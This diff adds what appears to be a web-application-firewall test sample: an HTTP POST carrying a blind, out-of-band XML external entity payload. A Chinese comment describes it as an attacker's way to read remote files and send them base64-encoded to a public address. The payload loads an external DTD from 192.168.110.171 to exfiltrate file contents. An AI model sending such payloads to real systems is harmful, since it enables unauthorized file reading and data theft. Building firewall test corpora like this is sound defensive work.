@@ -1,0 +1,18 @@
+# XML外部实体注入_远程文件读取无回显
+# 攻击者通过构造此语句在没有信息显示的情况下，读取其他远程服务器上任意文件，在经过base64编码发送到公网地址上以此来获得读取的信息
+POST /?bid=hd_tag_m8mv25ir HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25ir
+RM-PRO-Token: a50a548d49241e67fb7287404ec3392f
+RM-PRO-Time: 1742808471355
+User-Agent: curl/7.83.1
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+<!DOCTYPE message [
+    <!ENTITY % remote SYSTEM "http://192.168.110.171/xml.dtd">  
+    <!ENTITY %  file SYSTEM "php://filter/read=convert.base64-encode/resource=http://192.168.110.171/test">
+%remote;
+%send;
+]>
+<message>1234</message>
